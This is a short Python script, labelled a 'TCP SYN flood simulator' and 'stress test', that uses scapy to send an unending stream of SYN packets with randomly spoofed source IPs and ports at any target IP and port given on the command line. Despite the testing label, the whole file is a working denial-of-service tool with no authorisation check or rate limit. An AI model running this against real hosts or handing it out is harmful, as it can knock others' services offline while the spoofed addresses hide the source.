#!/usr/bin/env python3
import scapy.all as scapy
import sys
import random

print("=" * 50)
print("    EPSOM LABS: TCP SYN FLOOD SIMULATOR v1.0    ")
print("=" * 50)

if len(sys.argv) != 3:
    print("[!] Usage: sudo ./syn_flood_test.py <target_ip> <target_port>")
    sys.exit()
target_ip = sys.argv[1]
target_port = int(sys.argv[2])

print(f"[*] Starting stress test simulation on {target_ip}:{target_port}...")
print("[*] Press Ctrl+C to stop the simulation at any time.")

packet_count = 0

try:
    while True:

        random_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

        random_port = random.randint(1024,65535)

        ip_layer = scapy.IP(src=random_ip, dst=target_ip)
        tcp_layer = scapy.TCP(sport=random_port, dport=target_port, flags="S")

        packet = ip_layer / tcp_layer
        scapy.send(packet, verbose=False)

        packet_count += 1
        if packet_count % 100 == 0:
            print(f"[+] Shipped {packet_count} spoofed SYN packets successfully...")

except KeyboardInterrupt:
    print("\n" + "=" * 50)
    print(f"[!] Simulation stopped. Total packes sent: {packet_count}")
    print("=" * 50)


